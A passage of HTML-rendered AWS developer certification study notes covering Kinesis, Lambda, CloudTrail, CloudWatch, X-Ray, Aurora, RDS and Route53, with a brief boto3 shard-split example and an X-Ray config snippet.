<ul>
<li>records consist of a partition key and a data blob</li>
<li>producers can send 1MB/sec or 1000 msg/sec per shard</li>
</ul>
</li>
<li>Consumers receive data from data streams
<ul>
<li>consumers can be apps, lambda functions, Kinesis Data Firehose, or Kinesis Data Analytics</li>
<li>Consumers can receive messages at 2 MB/sec (shared version, across all consumers) per shard or 2 MB/sec (enhanced version) per consumer per shard
<img src="clouds/aws/dva-c02/images/kinesis-consumers.png" width="77%" height="40%" /></li>
</ul>
</li>
</ul>
</li>
<li>
<p>Once data is inserted into Kinesis, it cannot be deleted</p>
</li>
<li>
<p>Capacity Modes:</p>
<ul>
<li>Provisioned Mode
<ul>
<li>Choose the number of shards provisioner</li>
<li>Scale manually</li>
<li>Each shard gets 1 MB/s in and 2 MB/s out</li>
<li>Pay per shard provisioned per hour</li>
</ul>
</li>
<li>On-demand Mode:
<ul>
<li>No need to provision or manage capacity</li>
<li>Auto-scaling</li>
<li>Pay per stream per hour and data in/out per GB</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Access control to Data Streams using IAM policies</p>
</li>
<li>
<p>Encryption in flight with HTTPS and at rest with KMS</p>
</li>
<li>
<p>Kinesis Data Streams support VPC Endpoints</p>
</li>
<li>
<p>Monitor API calls using CloudTrail</p>
</li>
</ul>
<h3 id="kinesis-application-name"><a class="header" href="#kinesis-application-name">Kinesis Application Name:</a></h3>
<ul>
<li>Each application must have a unique name per (AWS account, region). The name is used to identify the DynamoDB and the namespace for CloudWatch metrics.</li>
</ul>
<h3 id="partition-keys"><a class="header" href="#partition-keys">Partition Keys:</a></h3>
<ul>
<li>Used to group data by shard within a stream. It must be present when writing to the stream.</li>
<li>When writing to a stream, Kinesis separates data records into multiple shards based on each record‚Äôs partition key.</li>
<li>Partition keys are Unicode strings with a maximum length of 256 bytes. An MD5 hash function is used to map partition keys to 128-bit integer values that define which shard records will end up in.</li>
</ul>
<h3 id="kinesis-shard"><a class="header" href="#kinesis-shard">Kinesis Shard:</a></h3>
<ul>
<li>Uniquely identified group of data records in a stream.</li>
<li>Multiple shards in a stream are possible.</li>
<li><strong>Single shard capacity:</strong>
<ul>
<li>Write: 1 MB/sec input, 1000 writes/sec.</li>
<li>Read: 2 MB/sec output, 5 transaction reads/sec.</li>
</ul>
</li>
<li><strong>Resharding:</strong>
<ul>
<li><strong>Shard split:</strong> divide a shard into two shards.
<ul>
<li>Example using boto3:
<pre><code class="language-python">sinfo = kinesis.describe_stream("BotoDemo")
hkey = int(sinfo["StreamDescription"]["Shards"][0]["HashKeyRange"]["EndingHashKey"])
shard_id = 'shardId-000000000000'  # we only have one shard!
kinesis.split_shard("BotoDemo", shard_id, str((hkey+0)/2))
</code></pre>
</li>
</ul>
</li>
<li><strong>Shard merge:</strong> merge two shards into one.</li>
</ul>
</li>
</ul>
<h3 id="kinesis-server-side-encryption"><a class="header" href="#kinesis-server-side-encryption">Kinesis Server-Side Encryption:</a></h3>
<ul>
<li>Can automatically encrypt data written, using KMS master keys. Both producer and consumer must have permission to access the master key.</li>
<li>Add <code>kms:GenerateDataKey</code> to producer‚Äôs role.</li>
<li>Add <code>kms:Decrypt</code> to consumer‚Äôs role.</li>
</ul>
<h3 id="kinesis-firehose"><a class="header" href="#kinesis-firehose">Kinesis Firehose:</a></h3>
<ul>
<li>Managed service for loading data from streams directly into S3, Redshift, and Elasticsearch.</li>
<li>Fully managed: scalability, sharding, and monitoring with zero admin.</li>
<li>Secure.</li>
<li><strong>Methods to Load Data:</strong>
<ul>
<li>Use Kinesis Agent.</li>
<li>Use AWS SDK.</li>
<li><strong>PutRecord and PutRecordBatch.</strong></li>
<li><strong>Firehose to S3:</strong>
<ul>
<li>Buffering of data before sending to S3. Sends whenever any of these conditions is met:
<ul>
<li>Buffer size (from 1 MB to 128 MB).</li>
<li>Buffer interval (from 60s to 900s).</li>
</ul>
</li>
<li>Can invoke AWS Lambda for data transformation.
<ul>
<li>Data flow:
<ol>
<li>Buffers incoming data up to 3 MB or buffering size specified, whichever is lowest.</li>
<li>Firehose invokes Lambda function.</li>
<li>Transformed data is sent from Lambda to Firehose for buffering.</li>
<li>Transformed data is delivered to the destination.</li>
</ol>
</li>
<li><strong>Response from Lambda must include:</strong>
<ul>
<li><code>recordId</code>: must be the same as prior to transformation.</li>
<li><code>result</code>: status, one of: ‚ÄúOk‚Äù, ‚ÄúDropped‚Äù, ‚ÄúProcessingFailed‚Äù.</li>
<li><code>data</code>: Transformed data payload.</li>
</ul>
</li>
<li><strong>Failure handling of data transformation:</strong>
<ul>
<li>3 retries.</li>
<li>Invocation errors logged in CloudWatch Logs.</li>
<li>Unsuccessful records are stored in <code>processing_failed</code> folder in S3.</li>
<li>It‚Äôs possible to store the source records in S3, prior to transformation (Backup S3 bucket).</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>Data Delivery Speed:</strong>
<ul>
<li><strong>S3:</strong> based on buffer size/buffer interval.</li>
<li><strong>Redshift:</strong> depending on how fast the Redshift cluster finishes the COPY command.</li>
<li><strong>Elasticsearch:</strong> depends on buffer size (1-100 MB) and buffer interval.</li>
</ul>
</li>
<li><strong>Firehose Failure Handling:</strong>
<ul>
<li><strong>S3:</strong> retries for up to 24 hrs.</li>
<li><strong>Redshift:</strong> retry duration from 0-7200 sec (2 hrs) from S3.
<ul>
<li>Skips S3 objects on failure.</li>
<li>Writes failed objects in manifest file, which can be used manually to recover lost data (manual backfill).</li>
</ul>
</li>
<li><strong>ElasticSearch:</strong> retry duration 0-7200 sec.
<ul>
<li>On failure, skips index request and stores in <code>index_failed</code> folder in S3.</li>
<li>Manual backfill.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="aws-kinesis-overview"><a class="header" href="#aws-kinesis-overview">AWS Kinesis Overview:</a></h2>
<ul>
<li>Enables real-time processing of streaming data at massive scale.</li>
<li><strong>Kinesis Streams:</strong>
<ul>
<li>Enables building custom applications that process or analyze streaming data for specialized needs.</li>
<li>Handles provisioning, deployment, ongoing-maintenance of hardware, software, or other services for the data streams.</li>
<li>Manages the infrastructure, storage, networking, and configuration needed to stream the data at the required data throughput level.</li>
<li>Synchronously replicates data across three facilities in an AWS Region, providing high availability and data durability.</li>
<li>Stores records of a stream for up to 24 hours, by default, from the time they are added to the stream. The limit can be raised to up to 7 days by enabling extended data retention.</li>
<li>Data such as clickstreams, application logs, social media, etc., can be added from multiple sources and within seconds is available for processing to the Amazon Kinesis Applications.</li>
<li>Provides ordering of records, as well as the ability to read and/or replay records in the same order to multiple Kinesis applications.</li>
<li>Useful for rapidly moving data off data producers and then continuously processing the data, whether it is to transform the data before emitting to a data store, run real-time metrics and analytics, or derive more complex data streams for further processing.</li>
</ul>
</li>
</ul>
<h3 id="use-cases-1"><a class="header" href="#use-cases-1">Use Cases:</a></h3>
<ul>
<li><strong>Accelerated log and data feed intake:</strong> Data producers can push data to Kinesis stream as soon as it is produced, preventing any data loss and making it available for processing within seconds.</li>
<li><strong>Real-time metrics and reporting:</strong> Metrics can be extracted and used to generate reports from data in real-time.</li>
<li><strong>Real-time data analytics:</strong> Run real-time streaming data analytics.</li>
<li><strong>Complex stream processing:</strong> Create Directed Acyclic Graphs (DAGs) of Kinesis Applications and data streams, with Kinesis applications adding to another Amazon Kinesis stream for further processing, enabling successive stages of stream processing.</li>
</ul>
<h3 id="kinesis-limits"><a class="header" href="#kinesis-limits">Kinesis Limits:</a></h3>
<ul>
<li>Stores records of a stream for up to 24 hours, by default, which can be extended to max 7 days.</li>
<li>Maximum size of a data blob (the data payload before Base64-encoding) within one record is 1 megabyte (MB).</li>
<li>Each shard can support up to 1000 PUT records per second.</li>
<li>Each account can provision 10 shards per region, which can be increased further through request.</li>
<li>Amazon Kinesis is designed to process streaming big data and the pricing model allows heavy PUTs rate.</li>
<li>Amazon S3 is a cost-effective way to store your data but not designed to handle a stream of data in real-time.</li>
</ul>
<h2 id="kinesis-streams-components"><a class="header" href="#kinesis-streams-components">Kinesis Streams Components:</a></h2>
<h3 id="shard"><a class="header" href="#shard">Shard:</a></h3>
<ul>
<li>Streams are made of shards and is the base throughput unit of a Kinesis stream.</li>
<li>Each shard provides a capacity of 1MB/sec data input and 2MB/sec data output.</li>
<li>Each shard can support up to 1000 PUT records per second.</li>
<li>All data is stored for 24 hours.</li>
<li>Replay data inside a 24-hour window.</li>
<li><strong>Capacity Limits:</strong> If the limits are exceeded, either by data throughput or the number of PUT records, the put data call will be rejected with a <code>ProvisionedThroughputExceeded</code> exception.
<ul>
<li>This can be handled by:
<ul>
<li>Implementing a retry on the data producer side, if this is due to a temporary rise of the stream‚Äôs input data rate.</li>
<li>Dynamically scaling the number of shared (resharding) to provide enough capacity for the put data calls to consistently succeed.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="record"><a class="header" href="#record">Record:</a></h3>
<ul>
<li>A record is the unit of data stored in an Amazon Kinesis stream.</li>
<li>A record is composed of a sequence number, partition key, and data blob.
<ul>
<li>Data blob is the data of interest your data producer adds to a stream.</li>
<li>Maximum size of a data blob (the data payload before Base64-encoding) is 1 MB.</li>
</ul>
</li>
</ul>
<h3 id="partition-key"><a class="header" href="#partition-key">Partition Key:</a></h3>
<ul>
<li>Used to segregate and route records to different shards of a stream.</li>
<li>Specified by your data producer while adding data to an Amazon Kinesis stream.</li>
</ul>
<h3 id="sequence-number"><a class="header" href="#sequence-number">Sequence Number:</a></h3>
<ul>
<li>A unique identifier for each record.</li>
<li>Assigned by Amazon Kinesis when a data producer calls <code>PutRecord</code> or <code>PutRecords</code> operation to add data to an Amazon Kinesis stream.</li>
<li>Sequence numbers for the same partition key generally increase over time; the longer the time period between <code>PutRecord</code> or <code>PutRecords</code> requests, the larger the sequence numbers become.</li>
</ul>
<h3 id="data-producers"><a class="header" href="#data-producers">Data Producers:</a></h3>
<ul>
<li>Data can be added to an Amazon Kinesis stream via <code>PutRecord</code> and <code>PutRecords</code> operations, Kinesis Producer Library (KPL), or Kinesis Agent.</li>
</ul>
<h3 id="amazon-kinesis-agent"><a class="header" href="#amazon-kinesis-agent">Amazon Kinesis Agent:</a></h3>
<ul>
<li>A pre-built Java application that offers an easy way to collect and send data to Amazon Kinesis stream.</li>
<li>Can be installed on Linux-based server environments such as web servers, log servers, and database servers.</li>
<li>Configured to monitor certain files on the disk and then continuously send new data to the Amazon Kinesis stream.</li>
</ul>
<h3 id="amazon-kinesis-producer-library-kpl"><a class="header" href="#amazon-kinesis-producer-library-kpl">Amazon Kinesis Producer Library (KPL):</a></h3>
<ul>
<li>An easy to use and highly configurable library that helps you put data into an Amazon Kinesis stream.</li>
<li>Presents a simple, asynchronous, and reliable interface that enables you to quickly achieve high producer throughput with minimal client resources.</li>
</ul>
<h3 id="amazon-kinesis-application"><a class="header" href="#amazon-kinesis-application">Amazon Kinesis Application:</a></h3>
<ul>
<li>A data consumer that reads and processes data from an Amazon Kinesis stream.</li>
<li>Can be built using either Amazon Kinesis API or Amazon Kinesis Client Library (KCL).</li>
</ul>
<h3 id="amazon-kinesis-client-library-kcl"><a class="header" href="#amazon-kinesis-client-library-kcl">Amazon Kinesis Client Library (KCL):</a></h3>
<ul>
<li>A pre-built library with multiple language support.</li>
<li>Delivers all records for a given partition key to the same record processor.</li>
<li>Makes it easier to build multiple applications reading from the same Kinesis stream (e.g., to perform counting, aggregation, and filtering).</li>
<li>Handles complex issues such as adapting to changes in stream volume, load-balancing streaming data, coordinating distributed services, and processing data with fault-tolerance.</li>
</ul>
<h3 id="amazon-kinesis-connector-library"><a class="header" href="#amazon-kinesis-connector-library">Amazon Kinesis Connector Library:</a></h3>
<ul>
<li>A pre-built library that helps you easily integrate Amazon Kinesis Streams with other AWS services and third-party tools.</li>
<li>Kinesis Client Library is required for Kinesis Connector Library.</li>
</ul>
<h3 id="amazon-kinesis-storm-spout"><a class="header" href="#amazon-kinesis-storm-spout">Amazon Kinesis Storm Spout:</a></h3>
<ul>
<li>A pre-built library that helps you easily integrate Amazon Kinesis Streams with Apache Storm.</li>
</ul>
<h2 id="kinesis-vs-sqs"><a class="header" href="#kinesis-vs-sqs">Kinesis vs SQS:</a></h2>
<ul>
<li><strong>Kinesis Streams</strong> enables real-time processing of streaming big data while <strong>SQS</strong> offers a reliable, highly scalable hosted queue for storing messages and moving data between distributed application components.</li>
<li>Kinesis provides ordering of records, as well as the ability to read and/or replay records in the same order to multiple Amazon Kinesis Applications, while SQS does not guarantee data ordering and provides at least once delivery of messages.</li>
<li>Kinesis stores the data up to 24 hours, by default, and can be extended to 7 days, while SQS stores the message up to 4 days, by default, and can be configured from 1 minute to 14 days but clears the message once deleted by the consumer.</li>
<li>Kinesis and SQS both guarantee at-least-once delivery of messages.</li>
<li>Kinesis supports multiple consumers, while SQS allows the messages to be delivered to only one consumer at a time and requires multiple queues to deliver messages to multiple consumers.</li>
</ul>
<h2 id="kinesis-use-case-requirements"><a class="header" href="#kinesis-use-case-requirements">Kinesis Use Case Requirements:</a></h2>
<ul>
<li>Ordering of records.</li>
<li>Ability to consume records in the same order a few hours later.</li>
<li>Ability for multiple applications to consume the same stream concurrently.</li>
<li>Routing related records to the same record processor (as in streaming MapReduce).</li>
</ul>
<h2 id="sqs-use-case-requirements"><a class="header" href="#sqs-use-case-requirements">SQS Use Case Requirements:</a></h2>
<ul>
<li>Messaging semantics like message-level ack/fail and visibility timeout.</li>
<li>Leveraging SQS‚Äôs ability to scale transparently.</li>
<li>Dynamically increasing concurrency/throughput at read time.</li>
<li>Individual message delay, which can be delayed.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lambda"><a class="header" href="#lambda">Lambda</a></h1>
<h2 id="introduction-12"><a class="header" href="#introduction-12">Introduction</a></h2>
<ul>
<li>Serverless, virtual functions</li>
<li>Short executions up to 15 minutes</li>
<li>Run on-demand</li>
<li>Pay for number of invocations and compute time</li>
<li>Works with many programming languages
<ul>
<li>Node.js, python, Java, c#, Go, Powershell, Ruby, and Custom Runtime API (which can run practically any language)</li>
</ul>
</li>
<li></li>
<li>You can provision up to 10GB of RAM per function</li>
<li></li>
</ul>
<h2 id="lambda-integrations"><a class="header" href="#lambda-integrations">Lambda Integrations</a></h2>
<ul>
<li>API Gateway</li>
<li>Kinesis</li>
<li>DynamoDB</li>
<li>S3</li>
<li>CloudFront</li>
<li>CloudWatch Events / EventBridge</li>
<li>CloudWatch Logs</li>
<li>SNS</li>
<li>SQS</li>
<li>Cognito</li>
</ul>
<h2 id="pricing-2"><a class="header" href="#pricing-2">Pricing</a></h2>
<ul>
<li>Pay per call:
<ul>
<li>First 1,000,000 requests are free</li>
<li>.20 per 1 million requests after the first million</li>
</ul>
</li>
<li>Pay per duration
<ul>
<li>400,000 GB-seconds of compute time per month for free</li>
</ul>
</li>
</ul>
<h2 id="synchronous-invocation"><a class="header" href="#synchronous-invocation">Synchronous Invocation</a></h2>
<ul>
<li>When invoking the function from the CLI, SDK, API Gateway, or ALB, the call is synchronous, meaning the result is returned right away</li>
<li>Error handling must happen on the client side (retires, exponential backoff, etc.)</li>
</ul>
<h2 id="asynchronous-invocation"><a class="header" href="#asynchronous-invocation">Asynchronous Invocation</a></h2>
<ul>
<li>S3, SNS, CloudWatch Events are all processed asynchronously</li>
<li>The events are placed in an internal event queue</li>
<li>The lambda function will read from the event queue and attempt to process the events</li>
<li>Lambda will attempt to retry failures up to 3 times
<ul>
<li>This means that event <b>may</b> be processed multiple times, so make sure the lambda function is idempotent</li>
<li>If the function is retried, you will see duplicate entries in CloudWatch Logs</li>
<li>You can define a DLQ (dead-letter queue) (SNS or SQS) for failed processing</li>
</ul>
</li>
<li>Async invocations allow you to speed up the processing if you don‚Äôt need to wait for the result</li>
</ul>
<h2 id="s3-event-notifications"><a class="header" href="#s3-event-notifications">S3 Event Notifications</a></h2>
<ul>
<li>Run a Lambda function when a event in S3 is detected</li>
</ul>
<h2 id="lambda-event-source-mapping"><a class="header" href="#lambda-event-source-mapping">Lambda Event Source Mapping</a></h2>
<ul>
<li>Lambda will poll from the sources and be invoked synchronously
<ul>
<li>Kinesis Data Streams</li>
<li>SQS or SQS FIFO</li>
<li>DynamoDB Streams</li>
</ul>
</li>
<li>Two categories of Event Source Mapping:
<ul>
<li>Streams
<ul>
<li>Kinesis or DynamoDB Streams</li>
<li>One Lambda invokation per stream shard</li>
<li>If you use parallelization, up to 10 batches processed per shard simultaneously</li>
</ul>
</li>
<li>Queues
<ul>
<li>Poll SQS using Long Polling</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lambda-in-vpc"><a class="header" href="#lambda-in-vpc">Lambda in VPC</a></h2>
<ul>
<li>By default, Lambda functions are launched outside of your VPC. Therefore, it cannot access resources in your VPC.</li>
<li>Lambda can create an Elastic Network Interface inside your VPC
<ul>
<li>You must define the VPC ID, subnets, and security groups</li>
<li>Lambda requires the AWSLambdaVPCAccessExecutionRole</li>
</ul>
</li>
<li>By default, a Lambda function in your VPC does not have internet access
<ul>
<li>Deploying a Lambda function in a public subnet <b>does not</b> give it internet access</li>
<li>Instead, you can deploy the Lambda function in a private subnet and give it internet access via a NAT Gateway / NAT Instance</li>
</ul>
</li>
</ul>
<h2 id="lambda-concurrency"><a class="header" href="#lambda-concurrency">Lambda Concurrency</a></h2>
<ul>
<li>Concurrency limit up to 1000 concurrent executions</li>
<li>each invocation over the concurrency limit will respond with a HTTP 429</li>
<li>Cold starts and provisioned concurrency
<ul>
<li>If the init is large, cold start could take a long time. This may cause the first request to have high latency than the rest</li>
<li>To resolve the cold start issue, you can use <code>Provisioned concurrency</code>
<ul>
<li>With Provisioned Concurrency, concurrency is allocated before the function is invoked</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lambda-containers"><a class="header" href="#lambda-containers">Lambda Containers</a></h2>
<ul>
<li>Deploy Lambda functions as container images up to 10GB from ECR</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudtrail"><a class="header" href="#cloudtrail">CloudTrail</a></h1>
<h2 id="introduction-13"><a class="header" href="#introduction-13">Introduction</a></h2>
<ul>
<li>Internal monitors of API calls being made</li>
<li>Audit changes to AWS resources</li>
<li>Enabled by default</li>
<li>Event Types:
<ul>
<li>Management Events</li>
<li>Data Events</li>
<li>CloudTrail Insights Events
<ul>
<li>analyze events and try to detect unusual activity in your account</li>
</ul>
</li>
</ul>
</li>
<li>Event Retention
<ul>
<li>Events are stored by default for 90 days</li>
<li>To keep events beyond this period, log them to S3 and use Athena to analyze them</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cloudwatch"><a class="header" href="#cloudwatch">CloudWatch</a></h1>
<h2 id="introduction-14"><a class="header" href="#introduction-14">Introduction</a></h2>
<ul>
<li>Metrics, Logs, Events, and Alarms</li>
</ul>
<h2 id="cloudwatch-metrics"><a class="header" href="#cloudwatch-metrics">CloudWatch Metrics</a></h2>
<ul>
<li>CloudWatch provides metrics for every service in AWS</li>
<li>Metric is a variable to monitor (CPU Utilization, Network In, etc.)</li>
<li>Metrics belong to namespaces</li>
<li>Dimension is an attribute of a metric (instance id, environment, etc.)</li>
<li>Up to 30 dimensions per metric</li>
<li>Metrics have timestamp</li>
<li>You can create dashboards of metrics</li>
</ul>
<h3 id="ec2-detailed-monitoring"><a class="header" href="#ec2-detailed-monitoring">EC2 Detailed Monitoring</a></h3>
<ul>
<li>By default, EC2 instance have metrics every 5 minutes</li>
<li>If you enable detailed monitoring, you can get metrics every 1 minute``</li>
<li>Use detailed monitoring if you want your ASG to scale faster</li>
<li>The AWS Free tier allows us to have 10 detailed monitoring metrics</li>
<li>EC2 memory usage is not pushed by default (you must push it from inside the instance as a custom metric)</li>
</ul>
<h2 id="cloudwatch-custom-metrics"><a class="header" href="#cloudwatch-custom-metrics">CloudWatch Custom Metrics</a></h2>
<ul>
<li>You can define your own custom metrics</li>
<li>Use an API call <code>PutMetricData</code></li>
</ul>
<h2 id="cloudwatch-logs"><a class="header" href="#cloudwatch-logs">CloudWatch Logs</a></h2>
<ul>
<li>Define log groups, usually representing an application</li>
<li>Log Stream: instances within application /log files/ containers</li>
<li>You can define log expiration policies</li>
<li>You can send CloudWatch logs to
<ul>
<li>S3</li>
<li>Kinesis Data Streams</li>
<li>Kinesis Data Firehose</li>
<li>AWS Lambda</li>
<li>OpenSearch</li>
</ul>
</li>
<li>Logs are encrypted by default</li>
</ul>
<h2 id="log-sources"><a class="header" href="#log-sources">Log Sources</a></h2>
<ul>
<li>
<p>SDK, CloudWatch Logs Agent, CloudWatch Unified Agent</p>
</li>
<li>
<p>BeanStalk: Collection of logs from the application</p>
</li>
<li>
<p>ECS: Collection from containers</p>
</li>
<li>
<p>AWS Lambda: collection from function logs</p>
</li>
<li>
<p>VPC Flow Log‚Äôs</p>
</li>
<li>
<p>API Gateway</p>
</li>
<li>
<p>CloudTrail based on a filter</p>
</li>
<li>
<p>Route53</p>
</li>
<li>
<p>Use CloudWatch Logs Insights to query logs</p>
</li>
</ul>
<h3 id="cloudwatch-logs-subscriptions"><a class="header" href="#cloudwatch-logs-subscriptions">CloudWatch Logs Subscriptions</a></h3>
<ul>
<li>Get a real-time log events from CloudWatch Logs for processing and analysis</li>
<li>Send to Kinesis Data Streams, Kinesis Data Firehose, or Lambda</li>
<li>Subscription Filter - filter which logs are events delivered to your destination</li>
</ul>
<h2 id="cloudwatch-alarms"><a class="header" href="#cloudwatch-alarms">CloudWatch Alarms</a></h2>
<ul>
<li>Trigger notifications from any metric</li>
<li>Alarm States
<ul>
<li>Ok</li>
<li>Insufficient Data</li>
<li>Alarm</li>
</ul>
</li>
<li>Targets
<ul>
<li>Actions on EC2 instances</li>
<li>Trigger autoscaling action</li>
<li>Send notification to SNS service</li>
</ul>
</li>
<li><b>Composite Alarms</b> monitor the state of multiple other alarms
<ul>
<li>AND and OR conditions</li>
</ul>
</li>
</ul>
<h2 id="cloudwatch-synthetics-canary"><a class="header" href="#cloudwatch-synthetics-canary">CloudWatch Synthetics Canary</a></h2>
<ul>
<li>Configurable script that can monitor your APIs, URLs, Websites, etc.</li>
<li>Reproduce what your customers do programmatically to find issues before customers are impacted</li>
<li>Blueprints
<ul>
<li>Heartbeat Monitor</li>
<li>API Canary</li>
<li>Broken Link Checker</li>
<li>Visual Monitoring</li>
<li>Canary Recorder</li>
<li>GUI Workflow Builder</li>
</ul>
</li>
</ul>
<h2 id="amazon-event-bridge"><a class="header" href="#amazon-event-bridge">Amazon Event Bridge</a></h2>
<ul>
<li>
<p>React to events. Examples:</p>
<ul>
<li>EC2 Instance started</li>
<li>Codebuild failed build</li>
<li>S3 upload object</li>
<li>schedule a cronjob</li>
<li>CloudTrail API call</li>
</ul>
</li>
</ul>
<img src="clouds/aws/dva-c02/images/eventbridge.png" width="77%" height="40%" />
<ul>
<li>Event Buses can be accessed across AWS accounts using Resource-Based Policies
<ul>
<li>Resource policies allow you to manage permissions for an EventBus</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="x-ray"><a class="header" href="#x-ray">x-ray</a></h1>
<h2 id="introduction-15"><a class="header" href="#introduction-15">Introduction</a></h2>
<ul>
<li>Troubleshooting application performance and errors</li>
<li>Distributed tracing of Micro-services</li>
<li>Compatible with
<ul>
<li>Lambda</li>
<li>Beanstalk</li>
<li>ECS</li>
<li>ELB</li>
<li>API Gateway</li>
<li>EC2 instances or any on-premises app server</li>
</ul>
</li>
<li>You can enable x-ray by:
<ul>
<li>Install the x-ray daemon (on a server) or enable x-ray integration (some AWS services such as lambda)</li>
<li>You can instrument x-ray in your code using the AWS SDK
<ul>
<li>python, java, go, .NET, node.js</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="x-ray-apis"><a class="header" href="#x-ray-apis">X-Ray APIs</a></h2>
<ul>
<li>Writes
<ul>
<li>PutTraceSegments - Uploads a segment document int x-ray</li>
<li>PutTelemetryRecords - Used by the AWS X-Ray daemon o upload telemetry</li>
<li>GetSamplingRules - Retrieve all sampling rules</li>
</ul>
</li>
<li>Reads
<ul>
<li>GetServiceGraph - main graph</li>
<li>BatchGetTraces - Retries a list of traces specified by Id</li>
<li>GetTraceSummaries - Retrieve Ids and annotations for traces available for a specified time frame using an optional filter</li>
<li>GetTraceGraph</li>
</ul>
</li>
</ul>
<h2 id="x-ray-with-beanstalk"><a class="header" href="#x-ray-with-beanstalk">X-Ray with Beanstalk</a></h2>
<ul>
<li>Beanstalk includes the x-ray daemon</li>
<li>You can run the daemon by setting an option in the Elastic Beanstalk console or with a configuration file (in .ebextensions/xray-daemon.confi)
<pre><code>option_settings:
  aws:elasticbeanstalk:xray:
    XRayEnabled: true
</code></pre>
</li>
<li>Make sure to give your instance profile the correct IAM permissions so that the x-ray daemon can function correctly</li>
<li>You app code must still be instrumented with the X-Ray integration code</li>
</ul>
<h2 id="ecs--x-ray"><a class="header" href="#ecs--x-ray">ECS + X-Ray</a></h2>
<ul>
<li>Pattens:
<ul>
<li>Run the X-Ray daemon container on every EC2 instance</li>
<li>Run the X-Ray container as a sidecar for the app containers (the only way to get ECS with Fargate working with X-Ray)</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aurora"><a class="header" href="#aurora">Aurora</a></h1>
<h2 id="introduction-16"><a class="header" href="#introduction-16">Introduction</a></h2>
<ul>
<li>AWS propriety database technology compatible with Postgres and Mysql</li>
<li>5x performance improvement over MySql, 3x performance improvement over Postgres</li>
<li>Storage automatically grows, starts at 10GB, grows up to 128 TB</li>
<li>Up to 15 read replicas, replication process is faster than MySql</li>
<li>Failover is instantaneous, HA is native to Aurora</li>
<li>About 25% more expensive than RDS</li>
</ul>
<h2 id="aurora-high-availability"><a class="header" href="#aurora-high-availability">Aurora High Availability</a></h2>
<ul>
<li>6 copies of your data across 3 AZ:
<ul>
<li>4 copies out of 6 need to be available for writes</li>
<li>3 copies out of 6 need to be available for reads</li>
</ul>
</li>
<li>Self-healing with peer-to-peer replication</li>
<li>Stored is striped across 100 volumes</li>
<li>Only one instance will take writes at a time, failover within 30 seconds
<ul>
<li>You can optionally enable ‚ÄúLocal Write Forwarding‚Äù to forward writes from a read replica to a write replica</li>
</ul>
</li>
<li>Supports cross region replication</li>
<li>Reader endpoint is load balanced across all read replicas. Writer endpoint points to the current writer instance</li>
</ul>
<h2 id="aurora-security"><a class="header" href="#aurora-security">Aurora Security</a></h2>
<ul>
<li>If the master is not encrypted, read replicas cannot be encrypted</li>
<li>To encrypt an unencrypted database, create a db snapshot and restore as encrypted</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rds-relational-database-service"><a class="header" href="#rds-relational-database-service">RDS (Relational Database Service)</a></h1>
<h2 id="introduction-17"><a class="header" href="#introduction-17">Introduction</a></h2>
<ul>
<li>Fully managed relational database service
<ul>
<li>Automated provisioning and maintenance</li>
<li>Full backups and point in time restore</li>
</ul>
</li>
<li>Monitoring dashboards</li>
<li>Multi AZ setup for DR</li>
<li>Read replicas for improved performance</li>
<li>Storage backed by EBS</li>
<li>Vertical and horizontal scaling</li>
<li>Supports
<ul>
<li>Postgres</li>
<li>MySql / MariaDB</li>
<li>Oracle</li>
<li>IBM DB2</li>
<li>MSSQL</li>
<li>Aurora (Postgres and MySQL)</li>
</ul>
</li>
<li>You cannot SSH or access the underlying database compute instance</li>
<li>Storage auto-scaling</li>
</ul>
<h2 id="read-replicas"><a class="header" href="#read-replicas">Read replicas</a></h2>
<ul>
<li>Scale out database reads
<ul>
<li>read replicas only support <b>select</b> statements</li>
</ul>
</li>
<li>Improves performance for reads</li>
<li>You can create up to 15 read replicas in the same AZ, cross AZ, or cross region</li>
<li>Asynchronous replication, reads are <em>eventually consistent</em></li>
<li>You can promote a read replica to a full read/write instance</li>
<li>Apps must update the connection string to use a read replica</li>
<li>Network costs
<ul>
<li>If the replica is in the same region, there is no fee for network traffic</li>
<li>Cross region replicas will cost you for replication traffic</li>
</ul>
</li>
</ul>
<h2 id="rds-proxy"><a class="header" href="#rds-proxy">RDS Proxy</a></h2>
<ul>
<li>Fully managed database proxy for RDS</li>
<li>Allow apps to pool and share DB connections established with the database</li>
<li>Improves database efficiency by reducing stress on the database resources by pooling connections at the proxy</li>
<li>Serverless, autoscaling, HA</li>
<li>Reduced RDS and Aurora failover time by up to 66%</li>
<li>RDS proxy is only accessible from within the VPC, it is never publicly accessible</li>
<li>RDS proxy is particularly helpful when you have auto-scaling lambda functions connecting to your database</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="route53"><a class="header" href="#route53">Route53</a></h1>
<h2 id="introduction-18"><a class="header" href="#introduction-18">Introduction</a></h2>
<ul>
<li>A highly available, fully managed, scalable, authoritative DNS service provided by Amazon</li>
<li>Also a domain registrar</li>
<li>Supports health checks for resources registered with DNS names</li>
<li>The only AWS service that provides 100% availability</li>
</ul>
<h2 id="hosted-zones"><a class="header" href="#hosted-zones">Hosted Zones</a></h2>
<ul>
<li>Public Hosted Zones</li>
<li>contains records that specify how to route traffic on the internet</li>
<li>Private Hosted Zones</li>
<li>Only hosts within the VPC can resolve the DNS names</li>
<li>You will pay 50 cents per month for each hosted zone</li>
<li>Domain names will cost you $12/year</li>
</ul>
<h2 id="ttl"><a class="header" href="#ttl">TTL</a></h2>
<ul>
<li>Time to live</li>
<li>i.e. how long a DNS record will be cached on a client machine</li>
</ul>
<h2 id="cname-vs-alias"><a class="header" href="#cname-vs-alias">CNAME vs Alias</a></h2>
<ul>
<li>lb l-1234.us-east-2.elb.amazonaws.com and you want myapp.mydomain.com</li>
<li>CNAME:</li>
<li>Points a hostname to any other hostname (app.domain.com =&gt; blabla.anything.com)</li>
